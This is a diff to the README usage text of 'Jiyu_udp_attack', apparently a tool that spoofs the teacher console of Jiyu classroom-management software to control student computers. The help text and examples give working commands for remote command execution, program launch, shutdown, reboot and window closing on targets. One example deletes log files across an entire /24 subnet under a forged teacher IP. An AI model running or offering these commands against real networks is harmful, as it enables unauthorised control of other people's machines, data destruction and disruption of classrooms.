@@ -20,52 +20,51 @@
 
 ```
 usage: Jiyu_udp_attack [-h] [-f <ip>] [-fp <port>] -t <ip> [-tp <port>]
-                       [-i <ip_id>] (-m <msg> | -w <url> | -c <command> |
-                       -e <program> [<args> ...] |
-                       -s [<timeout> [<message> ...]] |
-                       -r [<timeout> [<message> ...]] |
-                       -cw [<timeout> [<message> ...]] | -ctw |
-                       -n <name> <name_id> | --hex <hex_data> |
-                       --pkg <custom_data> [<args> ...])
+                       [-i <ip_id>]
+                       (-m <msg> | -w <url> | -c <command> | -e <program> [<args> ...] | -s [<timeout> [<message> ...]] | -r [<timeout> [<message> ...]] | -cw [<timeout> [<message> ...]] | -ctw | -n <name> <name_id> | --hex <hex_data> | --pkg <custom_data> [<args> ...])
 
 Jiyu Attack Script
 
-options:
+optional arguments:
   -h, --help            show this help message and exit
 
 Network Configuration:
   Specify the network configuration for the attack.
 
-  -f, --teacher-ip <ip>
+  -f <ip>, --teacher-ip <ip>
                         Teacher's IP address
-  -fp, --teacher-port <port>
+  -fp <port>, --teacher-port <port>
                         Teacher's port (default to random port)
-  -t, --target <ip>     Target IP address
-  -tp, --target-port <port>
+  -t <ip>, --target <ip>
+                        Target IP address
+  -tp <port>, --target-port <port>
                         Port to send packets to (default: 4705)
-  -i, --ip-id <ip_id>   IP ID for the packet (default: random ID)
+  -i <ip_id>, --ip-id <ip_id>
+                        IP ID for the packet (default: random ID)
 
 Attack Action:
   Specify the action to perform on the target machine. 
 
-  -m, --message <msg>   Send a message to the target machine
-  -w, --website <url>   Open a website on the target machine
-  -c, --command <command>
+  -m <msg>, --message <msg>
+                        Send a message to the target machine
+  -w <url>, --website <url>
+                        Open a website on the target machine
+  -c <command>, --command <command>
                         Execute a command on the target machine
                         (`cmd /D /C <command>`, Windows only)
-  -e, --execute, --minimize-execute, --maximize-execute <program> [<args> ...]
+  -e <program> [<args> ...], --execute <program> [<args> ...], --minimize-execute <program> [<args> ...], --maximize-execute <program> [<args> ...]
                         Execute a program with arguments on the target machine
-  -s, --shutdown [<timeout> [<message> ...]]
+  -s [<timeout> [<message> ...]], --shutdown [<timeout> [<message> ...]]
                         Shutdown the target machine,
                         optionally with a timeout and message
-  -r, --reboot [<timeout> [<message> ...]]
+  -r [<timeout> [<message> ...]], --reboot [<timeout> [<message> ...]]
                         Reboot the target machine,
                         optionally with a timeout and message
-  -cw, --close-windows [<timeout> [<message> ...]]
+  -cw [<timeout> [<message> ...]], --close-windows [<timeout> [<message> ...]]
                         Close all windows on the target machine
   -ctw, --close-top-window
                         Close the top window on the target machine
-  -n, --rename <name> <name_id>
+  -n <name> <name_id>, --rename <name> <name_id>
                         Rename the target machine
   --hex <hex_data>      Send raw hex data to the target machine
   --pkg <custom_data> [<args> ...]
@@ -74,9 +73,9 @@ Attack Action:
 Github Repositories: https://github.com/weilycoder/Jiyu_udp_attack/tree/main/ 
 
 Example usage:
-    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World" -i 1000
+    python Jiyu_udp_attack -t 192.168.106.100 -m "Hello World"
     python Jiyu_udp_attack -t 192.168.106.104 -w https://www.github.com
-    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log"
+    python Jiyu_udp_attack -t 192.168.106.0/24 -f 192.168.106.2 -c "del *.log" -i 1000
     python Jiyu_udp_attack -t 224.50.50.42 -e calc.exe
     python Jiyu_udp_attack -t 224.50.50.42 --maximize-execute notepad.exe
     python Jiyu_udp_attack -t 224.50.50.42 -s 60 "System is going to shutdown."
